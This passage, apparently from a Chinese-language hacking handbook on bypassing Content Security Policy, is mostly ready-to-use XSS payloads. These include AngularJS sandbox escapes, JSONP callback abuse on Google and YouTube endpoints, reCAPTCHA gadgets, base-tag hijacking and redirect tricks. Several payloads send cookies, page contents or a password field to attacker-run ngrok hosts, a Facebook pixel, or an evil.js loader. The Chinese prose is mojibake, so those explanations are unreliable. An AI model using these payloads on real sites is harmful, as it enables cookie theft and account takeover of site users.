<pre><code class="language-xml">&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"&gt;&lt;/script&gt;
&lt;div ng-app&gt; {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} &lt;/div&gt;


"&gt;&lt;script src="https://cdnjs.cloudflare.com/angular.min.js"&gt;&lt;/script&gt; &lt;div ng-app ng-csp&gt;{{$eval.constructor('alert(1)')()}}&lt;/div&gt;


"&gt;&lt;script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"&gt; &lt;/script&gt;
&lt;div ng-app ng-csp id=p ng-click=$event.view.alert(1337)&gt;


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js&gt;&lt;/script&gt;
&lt;iframe/ng-app/ng-csp/srcdoc="
&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js&gt;
&lt;/script&gt;
&lt;img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)&gt;"
&gt;
</code></pre>
<h4 id="ä½¿ç”¨-angular--ä¸€ä¸ªè¿”å›-window-å¯¹è±¡çš„å‡½æ•°åº“çš„æœ‰æ•ˆè½½è·-æŸ¥çœ‹æ­¤å¸–å­"><a class="header" href="#ä½¿ç”¨-angular--ä¸€ä¸ªè¿”å›-window-å¯¹è±¡çš„å‡½æ•°åº“çš„æœ‰æ•ˆè½½è·-æŸ¥çœ‹æ­¤å¸–å­">ä½¿ç”¨ Angular + ä¸€ä¸ªè¿”å› <code>window</code> å¯¹è±¡çš„å‡½æ•°åº“çš„æœ‰æ•ˆè½½è· (<a href="https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/">æŸ¥çœ‹æ­¤å¸–å­</a>)ï¼š</a></h4>
<p>{% hint style="info" %}
è¯¥å¸–å­æ˜¾ç¤ºæ‚¨å¯ä»¥ <strong>åŠ è½½</strong> æ¥è‡ª <code>cdn.cloudflare.com</code>ï¼ˆæˆ–ä»»ä½•å…¶ä»–å…è®¸çš„ JS åº“åº“ï¼‰çš„æ‰€æœ‰ <strong>åº“</strong>ï¼Œæ‰§è¡Œæ¯ä¸ªåº“ä¸­æ·»åŠ çš„æ‰€æœ‰å‡½æ•°ï¼Œå¹¶æ£€æŸ¥ <strong>å“ªäº›åº“ä¸­çš„å“ªäº›å‡½æ•°è¿”å› <code>window</code> å¯¹è±¡</strong>ã€‚
{% endhint %}</p>
<pre><code class="language-markup">&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"&gt;&lt;/script&gt;
&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /&gt;&lt;/script&gt;
&lt;div ng-app ng-csp&gt;
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d =&gt; {})") }}
&lt;/div&gt;


&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"&gt;&lt;/script&gt;
&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"&gt;&lt;/script&gt;
&lt;div ng-app ng-csp&gt;
{{$on.curry.call().alert('xss')}}
&lt;/div&gt;


&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"&gt;&lt;/script&gt;
&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"&gt;&lt;/script&gt;
&lt;div ng-app ng-csp&gt;
{{[].erase.call().alert('xss')}}
&lt;/div&gt;
</code></pre>
<p>Angular XSSæ¥è‡ªç±»åï¼š</p>
<pre><code class="language-html">&lt;div ng-app&gt;
&lt;strong class="ng-init:constructor.constructor('alert(1)')()"&gt;aaa&lt;/strong&gt;
&lt;/div&gt;
</code></pre>
<h4 id="æ»¥ç”¨è°·æ­Œ-recaptcha-js-ä»£ç "><a class="header" href="#æ»¥ç”¨è°·æ­Œ-recaptcha-js-ä»£ç ">æ»¥ç”¨è°·æ­Œ reCAPTCHA JS ä»£ç </a></h4>
<p>æ ¹æ® <a href="https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?_x_tr_sl=es&amp;_x_tr_tl=en&amp;_x_tr_hl=es&amp;_x_tr_pto=wapp#noteninja-3-solves"><strong>è¿™ç¯‡ CTF æ–‡ç« </strong></a>ï¼Œæ‚¨å¯ä»¥åœ¨ CSP å†…éƒ¨æ»¥ç”¨ <a href="https://www.google.com/recaptcha/">https://www.google.com/recaptcha/</a> æ¥æ‰§è¡Œä»»æ„ JS ä»£ç ï¼Œä»è€Œç»•è¿‡ CSPï¼š</p>
<pre><code class="language-html">&lt;div
ng-controller="CarouselController as c"
ng-init="c.init()"
&gt;
&amp;#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
&lt;div carousel&gt;&lt;div slides&gt;&lt;/div&gt;&lt;/div&gt;

&lt;script src="https://www.google.com/recaptcha/about/js/main.min.js"&gt;&lt;/script&gt;
</code></pre>
<p>æ›´å¤š<a href="https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/"><strong>æ¥è‡ªæ­¤æ–‡æ¡£çš„æœ‰æ•ˆè½½è·</strong></a>:</p>
<pre><code class="language-html">&lt;script src='https://www.google.com/recaptcha/about/js/main.min.js'&gt;&lt;/script&gt;

&lt;!-- Trigger alert --&gt;
&lt;img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'&gt;

&lt;!-- Reuse nonce --&gt;
&lt;img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'&gt;
</code></pre>
<h4 id="åˆ©ç”¨-wwwgooglecom-è¿›è¡Œå¼€æ”¾é‡å®šå‘"><a class="header" href="#åˆ©ç”¨-wwwgooglecom-è¿›è¡Œå¼€æ”¾é‡å®šå‘">åˆ©ç”¨ www.google.com è¿›è¡Œå¼€æ”¾é‡å®šå‘</a></h4>
<p>ä»¥ä¸‹ URL é‡å®šå‘åˆ° example.comï¼ˆæ¥è‡ª <a href="https://www.landh.tech/blog/20240304-google-hack-50000/">è¿™é‡Œ</a>ï¼‰ï¼š</p>
<pre><code>https://www.google.com/amp/s/example.com/
</code></pre>
<p>æ»¥ç”¨ *.google.com/script.google.com</p>
<p>å¯ä»¥æ»¥ç”¨ Google Apps Script åœ¨ script.google.com å†…çš„é¡µé¢æ¥æ”¶ä¿¡æ¯ã€‚å°±åƒåœ¨<a href="https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/">è¿™ä»½æŠ¥å‘Šä¸­</a>æ‰€åšçš„é‚£æ ·ã€‚</p>
<h3 id="ç¬¬ä¸‰æ–¹ç«¯ç‚¹--jsonp"><a class="header" href="#ç¬¬ä¸‰æ–¹ç«¯ç‚¹--jsonp">ç¬¬ä¸‰æ–¹ç«¯ç‚¹ + JSONP</a></h3>
<pre><code class="language-http">Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
</code></pre>
<p>åƒè¿™æ ·çš„åœºæ™¯ï¼Œå…¶ä¸­ <code>script-src</code> è®¾ç½®ä¸º <code>self</code> å’Œä¸€ä¸ªç‰¹å®šçš„ç™½åå•åŸŸï¼Œå¯ä»¥é€šè¿‡ JSONP ç»•è¿‡ã€‚JSONP ç«¯ç‚¹å…è®¸ä¸å®‰å…¨çš„å›è°ƒæ–¹æ³•ï¼Œè¿™ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿæ‰§è¡Œ XSSï¼Œå·¥ä½œæœ‰æ•ˆè½½è·ï¼š</p>
<pre><code class="language-markup">"&gt;&lt;script src="https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert#1"&gt;&lt;/script&gt;
"&gt;&lt;script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"&gt;&lt;/script&gt;
</code></pre>
<pre><code class="language-html">https://www.youtube.com/oembed?callback=alert;
&lt;script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&amp;format=json&amp;callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"&gt;&lt;/script&gt;
</code></pre>
<p><a href="https://github.com/zigoo0/JSONBee"><strong>JSONBee</strong></a> <strong>åŒ…å«å¯ç”¨äºä¸åŒç½‘ç«™çš„CSPç»•è¿‡çš„ç°æˆJSONPç«¯ç‚¹ã€‚</strong></p>
<p>å¦‚æœ<strong>å—ä¿¡ä»»çš„ç«¯ç‚¹åŒ…å«å¼€æ”¾é‡å®šå‘</strong>ï¼Œåˆ™ä¼šå‘ç”Ÿç›¸åŒçš„æ¼æ´ï¼Œå› ä¸ºå¦‚æœåˆå§‹ç«¯ç‚¹æ˜¯å—ä¿¡ä»»çš„ï¼Œåˆ™é‡å®šå‘ä¹Ÿæ˜¯å—ä¿¡ä»»çš„ã€‚</p>
<h3 id="ç¬¬ä¸‰æ–¹æ»¥ç”¨"><a class="header" href="#ç¬¬ä¸‰æ–¹æ»¥ç”¨">ç¬¬ä¸‰æ–¹æ»¥ç”¨</a></h3>
<p>å¦‚<a href="https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses">ä»¥ä¸‹å¸–å­</a>æ‰€è¿°ï¼Œæœ‰è®¸å¤šç¬¬ä¸‰æ–¹åŸŸåå¯èƒ½åœ¨CSPä¸­è¢«å…è®¸ï¼Œå¯ä»¥è¢«æ»¥ç”¨ä»¥æå–æ•°æ®æˆ–æ‰§è¡ŒJavaScriptä»£ç ã€‚è¿™äº›ç¬¬ä¸‰æ–¹ä¸­çš„ä¸€äº›æ˜¯ï¼š</p>
<div class="table-wrapper"><table><thead><tr><th>å®ä½“</th><th>å…è®¸çš„åŸŸå</th><th>èƒ½åŠ›</th></tr></thead><tbody>
<tr><td>Facebook</td><td>www.facebook.com, *.facebook.com</td><td>Exfil</td></tr>
<tr><td>Hotjar</td><td>*.hotjar.com, ask.hotjar.io</td><td>Exfil</td></tr>
<tr><td>Jsdelivr</td><td>*.jsdelivr.com, cdn.jsdelivr.net</td><td>Exec</td></tr>
<tr><td>Amazon CloudFront</td><td>*.cloudfront.net</td><td>Exfil, Exec</td></tr>
<tr><td>Amazon AWS</td><td>*.amazonaws.com</td><td>Exfil, Exec</td></tr>
<tr><td>Azure Websites</td><td>*.azurewebsites.net, *.azurestaticapps.net</td><td>Exfil, Exec</td></tr>
<tr><td>Salesforce Heroku</td><td>*.herokuapp.com</td><td>Exfil, Exec</td></tr>
<tr><td>Google Firebase</td><td>*.firebaseapp.com</td><td>Exfil, Exec</td></tr>
</tbody></table>
</div>
<p>å¦‚æœæ‚¨åœ¨ç›®æ ‡çš„CSPä¸­å‘ç°ä»»ä½•å…è®¸çš„åŸŸåï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿé€šè¿‡åœ¨ç¬¬ä¸‰æ–¹æœåŠ¡ä¸Šæ³¨å†Œæ¥ç»•è¿‡CSPï¼Œå¹¶å°†æ•°æ®æå–åˆ°è¯¥æœåŠ¡æˆ–æ‰§è¡Œä»£ç ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨å‘ç°ä»¥ä¸‹CSPï¼š</p>
<pre><code>Content-Security-Policyâ€‹: default-src 'selfâ€™ www.facebook.com;â€‹
</code></pre>
<p>æˆ–</p>
<pre><code>Content-Security-Policyâ€‹: connect-src www.facebook.com;â€‹
</code></pre>
<p>æ‚¨åº”è¯¥èƒ½å¤Ÿæå–æ•°æ®ï¼Œç±»ä¼¼äºä½¿ç”¨ <a href="https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp">Google Analytics</a>/<a href="https://blog.deteact.com/csp-bypass/">Google Tag Manager</a> ä¸€ç›´ä»¥æ¥çš„åšæ³•ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨éµå¾ªä»¥ä¸‹ä¸€èˆ¬æ­¥éª¤ï¼š</p>
<ol>
<li>åœ¨æ­¤å¤„åˆ›å»ºä¸€ä¸ª Facebook å¼€å‘è€…å¸æˆ·ã€‚</li>
<li>åˆ›å»ºä¸€ä¸ªæ–°çš„â€œFacebook ç™»å½•â€åº”ç”¨å¹¶é€‰æ‹©â€œç½‘ç«™â€ã€‚</li>
<li>è½¬åˆ°â€œè®¾ç½® -&gt; åŸºæœ¬â€ï¼Œè·å–æ‚¨çš„â€œåº”ç”¨ IDâ€</li>
<li>åœ¨æ‚¨æƒ³è¦æå–æ•°æ®çš„ç›®æ ‡ç½‘ç«™ä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡â€œcustomEventâ€å’Œæ•°æ®è´Ÿè½½ç›´æ¥ä½¿ç”¨ Facebook SDK å°å·¥å…·â€œfbqâ€æ¥æå–æ•°æ®ã€‚</li>
<li>è½¬åˆ°æ‚¨çš„åº”ç”¨â€œäº‹ä»¶ç®¡ç†å™¨â€ï¼Œé€‰æ‹©æ‚¨åˆ›å»ºçš„åº”ç”¨ï¼ˆè¯·æ³¨æ„ï¼Œäº‹ä»¶ç®¡ç†å™¨å¯ä»¥åœ¨ç±»ä¼¼äºæ­¤çš„ URL ä¸­æ‰¾åˆ°ï¼šhttps://www.facebook.com/events_manager2/list/pixel/[app-id]/test_eventsï¼‰</li>
<li>é€‰æ‹©â€œæµ‹è¯•äº‹ä»¶â€é€‰é¡¹å¡ï¼Œä»¥æŸ¥çœ‹â€œæ‚¨çš„â€ç½‘ç«™å‘é€çš„äº‹ä»¶ã€‚</li>
</ol>
<p>ç„¶åï¼Œåœ¨å—å®³è€…ä¸€ä¾§ï¼Œæ‚¨æ‰§è¡Œä»¥ä¸‹ä»£ç ä»¥åˆå§‹åŒ– Facebook è·Ÿè¸ªåƒç´ ï¼ŒæŒ‡å‘æ”»å‡»è€…çš„ Facebook å¼€å‘è€…å¸æˆ·åº”ç”¨ IDï¼Œå¹¶å‘å‡ºå¦‚ä¸‹çš„è‡ªå®šä¹‰äº‹ä»¶ï¼š</p>
<pre><code class="language-JavaScript">fbq('init', '1279785999289471');â€‹ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{â€‹
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"â€‹
});
</code></pre>
<p>å…³äºå‰è¡¨ä¸­æŒ‡å®šçš„å…¶ä»–ä¸ƒä¸ªç¬¬ä¸‰æ–¹åŸŸåï¼Œè¿˜æœ‰è®¸å¤šå…¶ä»–æ–¹æ³•å¯ä»¥æ»¥ç”¨å®ƒä»¬ã€‚è¯·å‚è€ƒä¹‹å‰çš„ <a href="https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses">blog post</a> ä»¥è·å–æœ‰å…³å…¶ä»–ç¬¬ä¸‰æ–¹æ»¥ç”¨çš„æ›´å¤šè§£é‡Šã€‚</p>
<h3 id="é€šè¿‡-rpoç›¸å¯¹è·¯å¾„è¦†ç›–ç»•è¿‡"><a class="header" href="#é€šè¿‡-rpoç›¸å¯¹è·¯å¾„è¦†ç›–ç»•è¿‡">é€šè¿‡ RPOï¼ˆç›¸å¯¹è·¯å¾„è¦†ç›–ï¼‰ç»•è¿‡ <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a></a></h3>
<p>é™¤äº†å‰é¢æåˆ°çš„é‡å®šå‘ä»¥ç»•è¿‡è·¯å¾„é™åˆ¶ï¼Œè¿˜æœ‰ä¸€ç§ç§°ä¸ºç›¸å¯¹è·¯å¾„è¦†ç›–ï¼ˆRPOï¼‰çš„æŠ€æœ¯å¯ä»¥åœ¨æŸäº›æœåŠ¡å™¨ä¸Šä½¿ç”¨ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå¦‚æœ CSP å…è®¸è·¯å¾„ <code>https://example.com/scripts/react/</code>ï¼Œåˆ™å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç»•è¿‡ï¼š</p>
<pre><code class="language-html">&lt;script src="https://example.com/scripts/react/..%2fangular%2fangular.js"&gt;&lt;/script&gt;
</code></pre>
<p>æµè§ˆå™¨æœ€ç»ˆä¼šåŠ è½½ <code>https://example.com/scripts/angular/angular.js</code>ã€‚</p>
<p>è¿™ä¹‹æ‰€ä»¥æœ‰æ•ˆï¼Œæ˜¯å› ä¸ºå¯¹äºæµè§ˆå™¨æ¥è¯´ï¼Œä½ æ­£åœ¨åŠ è½½ä¸€ä¸ªåä¸º <code>..%2fangular%2fangular.js</code> çš„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä½äº <code>https://example.com/scripts/react/</code> ä¸‹ï¼Œè¿™ç¬¦åˆ CSPã€‚</p>
<p>âˆ‘ï¼Œå®ƒä»¬ä¼šè§£ç å®ƒï¼Œæœ‰æ•ˆåœ°è¯·æ±‚ <code>https://example.com/scripts/react/../angular/angular.js</code>ï¼Œè¿™ç­‰åŒäº <code>https://example.com/scripts/angular/angular.js</code>ã€‚</p>
<p>é€šè¿‡ <strong>åˆ©ç”¨æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´ URL è§£é‡Šçš„ä¸ä¸€è‡´æ€§ï¼Œå¯ä»¥ç»•è¿‡è·¯å¾„è§„åˆ™</strong>ã€‚</p>
<p>è§£å†³æ–¹æ¡ˆæ˜¯ä¸è¦åœ¨æœåŠ¡å™¨ç«¯å°† <code>%2f</code> è§†ä¸º <code>/</code>ï¼Œç¡®ä¿æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ä¸€è‡´è§£é‡Šï¼Œä»¥é¿å…æ­¤é—®é¢˜ã€‚</p>
<p>åœ¨çº¿ç¤ºä¾‹ï¼š<a href="https://jsbin.com/werevijewa/edit?html,output"> </a><a href="https://jsbin.com/werevijewa/edit?html,output">https://jsbin.com/werevijewa/edit?html,output</a></p>
<h3 id="iframes-js-æ‰§è¡Œ"><a class="header" href="#iframes-js-æ‰§è¡Œ">Iframes JS æ‰§è¡Œ</a></h3>
<p>{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
<a href="../xss-cross-site-scripting/iframes-in-xss-and-csp.html">iframes-in-xss-and-csp.md</a>
{% endcontent-ref %}</p>
<h3 id="ç¼ºå¤±-base-uri"><a class="header" href="#ç¼ºå¤±-base-uri">ç¼ºå¤± <strong>base-uri</strong></a></h3>
<p>å¦‚æœç¼ºå°‘ <strong>base-uri</strong> æŒ‡ä»¤ï¼Œä½ å¯ä»¥åˆ©ç”¨å®ƒæ‰§è¡Œ <a href="../dangling-markup-html-scriptless-injection/"><strong>æ‚¬æŒ‚æ ‡è®°æ³¨å…¥</strong></a>ã€‚</p>
<p>æ­¤å¤–ï¼Œå¦‚æœ <strong>é¡µé¢ä½¿ç”¨ç›¸å¯¹è·¯å¾„åŠ è½½è„šæœ¬</strong>ï¼ˆå¦‚ <code>&lt;script src="/js/app.js"&gt;</code>ï¼‰å¹¶ä½¿ç”¨ <strong>Nonce</strong>ï¼Œä½ å¯ä»¥åˆ©ç”¨ <strong>base</strong> <strong>æ ‡ç­¾</strong> ä½¿å…¶ <strong>ä»ä½ è‡ªå·±çš„æœåŠ¡å™¨åŠ è½½</strong> è„šæœ¬ï¼Œä»è€Œå®ç° <strong>XSS</strong>ã€‚<br />
å¦‚æœæ˜“å—æ”»å‡»çš„é¡µé¢æ˜¯é€šè¿‡ <strong>httpS</strong> åŠ è½½çš„ï¼Œè¯·åœ¨ base ä¸­ä½¿ç”¨ httpS URLã€‚</p>
<pre><code class="language-html">&lt;base href="https://www.attacker.com/"&gt;
</code></pre>
<h3 id="angularjs-äº‹ä»¶"><a class="header" href="#angularjs-äº‹ä»¶">AngularJS äº‹ä»¶</a></h3>
<p>ä¸€ä¸ªç‰¹å®šçš„æ”¿ç­–ç§°ä¸ºå†…å®¹å®‰å…¨æ”¿ç­– (CSP) å¯èƒ½ä¼šé™åˆ¶ JavaScript äº‹ä»¶ã€‚å°½ç®¡å¦‚æ­¤ï¼ŒAngularJS å¼•å…¥äº†è‡ªå®šä¹‰äº‹ä»¶ä½œä¸ºæ›¿ä»£ã€‚åœ¨äº‹ä»¶ä¸­ï¼ŒAngularJS æä¾›äº†ä¸€ä¸ªç‹¬ç‰¹çš„å¯¹è±¡ <code>$event</code>ï¼Œå¼•ç”¨åŸç”Ÿæµè§ˆå™¨äº‹ä»¶å¯¹è±¡ã€‚è¿™ä¸ª <code>$event</code> å¯¹è±¡å¯ä»¥è¢«åˆ©ç”¨æ¥è§„é¿ CSPã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨ Chrome ä¸­ï¼Œ<code>$event/event</code> å¯¹è±¡å…·æœ‰ä¸€ä¸ª <code>path</code> å±æ€§ï¼ŒåŒ…å«ä¸€ä¸ªå¯¹è±¡æ•°ç»„ï¼Œæ¶‰åŠäº‹ä»¶çš„æ‰§è¡Œé“¾ï¼Œ<code>window</code> å¯¹è±¡å§‹ç»ˆä½äºæœ«å°¾ã€‚è¿™ä¸ªç»“æ„å¯¹äºæ²™ç®±é€ƒé€¸ç­–ç•¥è‡³å…³é‡è¦ã€‚</p>
<p>é€šè¿‡å°†è¿™ä¸ªæ•°ç»„ä¼ é€’ç»™ <code>orderBy</code> è¿‡æ»¤å™¨ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œè¿­ä»£ï¼Œåˆ©ç”¨ç»ˆç«¯å…ƒç´ ï¼ˆ<code>window</code> å¯¹è±¡ï¼‰è§¦å‘ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œå¦‚ <code>alert()</code>ã€‚ä¸‹é¢çš„ä»£ç ç‰‡æ®µæ¼”ç¤ºäº†è¿™ä¸ªè¿‡ç¨‹ï¼š</p>
<pre><code class="language-xml">&lt;input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27&gt;#x
?search=&lt;input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'&gt;#x
</code></pre>
<p>è¿™ä¸ªä»£ç ç‰‡æ®µçªå‡ºäº†ä½¿ç”¨ <code>ng-focus</code> æŒ‡ä»¤è§¦å‘äº‹ä»¶ï¼Œåˆ©ç”¨ <code>$event.path|orderBy</code> æ“ä½œ <code>path</code> æ•°ç»„ï¼Œå¹¶åˆ©ç”¨ <code>window</code> å¯¹è±¡æ‰§è¡Œ <code>alert()</code> å‡½æ•°ï¼Œä»è€Œæ­ç¤º <code>document.cookie</code>ã€‚</p>
<p><strong>åœ¨</strong> <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"><strong>https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</strong></a> <strong>ä¸­æŸ¥æ‰¾å…¶ä»– Angular ç»•è¿‡æ–¹æ³•</strong></p>
<h3 id="angularjs-å’Œç™½åå•åŸŸå"><a class="header" href="#angularjs-å’Œç™½åå•åŸŸå">AngularJS å’Œç™½åå•åŸŸå</a></h3>
<pre><code>Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
</code></pre>
<p>ä¸€ä¸ªåœ¨ Angular JS åº”ç”¨ç¨‹åºä¸­ä¸ºè„šæœ¬åŠ è½½åˆ—å…¥ç™½åå•çš„ CSP ç­–ç•¥å¯ä»¥é€šè¿‡è°ƒç”¨å›è°ƒå‡½æ•°å’ŒæŸäº›æ˜“å—æ”»å‡»çš„ç±»æ¥ç»•è¿‡ã€‚æœ‰å…³æ­¤æŠ€æœ¯çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…æ­¤ <a href="https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it&#x27;s-CSP!%22">git repository</a> ä¸­çš„è¯¦ç»†æŒ‡å—ã€‚</p>
<p>æœ‰æ•ˆçš„æœ‰æ•ˆè½½è·ï¼š</p>
<pre><code class="language-html">&lt;script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337&gt;&lt;/script&gt;
ng-app"ng-csp ng-click=$event.view.alert(1337)&gt;&lt;script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js&gt;&lt;/script&gt;

&lt;!-- no longer working --&gt;
&lt;script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"&gt;
</code></pre>
<p>å…¶ä»– JSONP ä»»æ„æ‰§è¡Œç«¯ç‚¹å¯ä»¥åœ¨ <a href="https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt"><strong>è¿™é‡Œ</strong></a> æ‰¾åˆ°ï¼ˆå…¶ä¸­ä¸€äº›å·²è¢«åˆ é™¤æˆ–ä¿®å¤ï¼‰</p>
<h3 id="é€šè¿‡é‡å®šå‘ç»•è¿‡"><a class="header" href="#é€šè¿‡é‡å®šå‘ç»•è¿‡">é€šè¿‡é‡å®šå‘ç»•è¿‡</a></h3>
<p>å½“ CSP é‡åˆ°æœåŠ¡å™¨ç«¯é‡å®šå‘æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿå¦‚æœé‡å®šå‘å¯¼è‡´åˆ°ä¸€ä¸ªä¸è¢«å…è®¸çš„ä¸åŒæºï¼Œå®ƒä»ç„¶ä¼šå¤±è´¥ã€‚</p>
<p>ç„¶è€Œï¼Œæ ¹æ® <a href="https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects">CSP è§„èŒƒ 4.2.2.3. è·¯å¾„å’Œé‡å®šå‘</a> ä¸­çš„æè¿°ï¼Œå¦‚æœé‡å®šå‘å¯¼è‡´åˆ°ä¸€ä¸ªä¸åŒçš„è·¯å¾„ï¼Œå®ƒå¯ä»¥ç»•è¿‡åŸå§‹é™åˆ¶ã€‚</p>
<p>è¿™æ˜¯ä¸€ä¸ªä¾‹å­ï¼š</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d"&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id=userContent&gt;
&lt;script src="https://https://www.google.com/test"&gt;&lt;/script&gt;
&lt;script src="https://https://www.google.com/a/test"&gt;&lt;/script&gt;
&lt;script src="http://localhost:5555/301"&gt;&lt;/script&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>å¦‚æœ CSP è®¾ç½®ä¸º <code>https://www.google.com/a/b/c/d</code>ï¼Œç”±äºè·¯å¾„è¢«è€ƒè™‘ï¼Œ<code>/test</code> å’Œ <code>/a/test</code> è„šæœ¬å°†è¢« CSP é˜»æ­¢ã€‚</p>
<p>ç„¶è€Œï¼Œæœ€ç»ˆçš„ <code>http://localhost:5555/301</code> å°†åœ¨æœåŠ¡å™¨ç«¯ <strong>é‡å®šå‘åˆ° <code>https://www.google.com/complete/search?client=chrome&amp;q=123&amp;jsonp=alert(1)//</code></strong>ã€‚ç”±äºè¿™æ˜¯ä¸€ä¸ªé‡å®šå‘ï¼Œ<strong>è·¯å¾„ä¸è¢«è€ƒè™‘</strong>ï¼Œå› æ­¤ <strong>è„šæœ¬å¯ä»¥è¢«åŠ è½½</strong>ï¼Œä»è€Œç»•è¿‡è·¯å¾„é™åˆ¶ã€‚</p>
<p>é€šè¿‡è¿™ç§é‡å®šå‘ï¼Œå³ä½¿è·¯å¾„å®Œå…¨æŒ‡å®šï¼Œä»ç„¶ä¼šè¢«ç»•è¿‡ã€‚</p>
<p>å› æ­¤ï¼Œæœ€ä½³è§£å†³æ–¹æ¡ˆæ˜¯ç¡®ä¿ç½‘ç«™æ²¡æœ‰ä»»ä½•å¼€æ”¾é‡å®šå‘æ¼æ´ï¼Œå¹¶ä¸” CSP è§„åˆ™ä¸­æ²¡æœ‰å¯ä»¥è¢«åˆ©ç”¨çš„åŸŸã€‚</p>
<h3 id="é€šè¿‡æ‚¬æŒ‚æ ‡è®°ç»•è¿‡-csp"><a class="header" href="#é€šè¿‡æ‚¬æŒ‚æ ‡è®°ç»•è¿‡-csp">é€šè¿‡æ‚¬æŒ‚æ ‡è®°ç»•è¿‡ CSP</a></h3>
<p>é˜…è¯» <a href="../dangling-markup-html-scriptless-injection/">å¦‚ä½•è¿™é‡Œ</a>ã€‚</p>
<h3 id="unsafe-inline-img-src--é€šè¿‡-xss"><a class="header" href="#unsafe-inline-img-src--é€šè¿‡-xss">'unsafe-inline'; img-src *; é€šè¿‡ XSS</a></h3>
<pre><code>default-src 'self' 'unsafe-inline'; img-src *;
</code></pre>
<p><code>'unsafe-inline'</code> æ„å‘³ç€æ‚¨å¯ä»¥åœ¨ä»£ç ä¸­æ‰§è¡Œä»»ä½•è„šæœ¬ï¼ˆXSS å¯ä»¥æ‰§è¡Œä»£ç ï¼‰ï¼Œè€Œ <code>img-src *</code> æ„å‘³ç€æ‚¨å¯ä»¥åœ¨ç½‘é¡µä¸­ä½¿ç”¨æ¥è‡ªä»»ä½•èµ„æºçš„ä»»ä½•å›¾åƒã€‚</p>
